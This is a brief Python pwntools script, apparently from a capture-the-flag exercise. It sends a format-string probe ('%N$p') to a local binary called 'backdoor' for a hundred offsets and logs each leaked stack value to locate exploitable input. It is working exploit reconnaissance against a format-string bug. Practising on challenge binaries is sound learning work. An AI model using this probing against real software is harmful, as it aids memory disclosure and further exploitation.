from pwn import *
elf = context.binary = ELF("./backdoor")
for i in range(100):
    p = process()
    p.sendline(f"AAAAAAAA|%{i}$p")
    p.recvuntil(b"\n")
    log.info(f"Ke {i}: {p.recvline()}")
    p.close()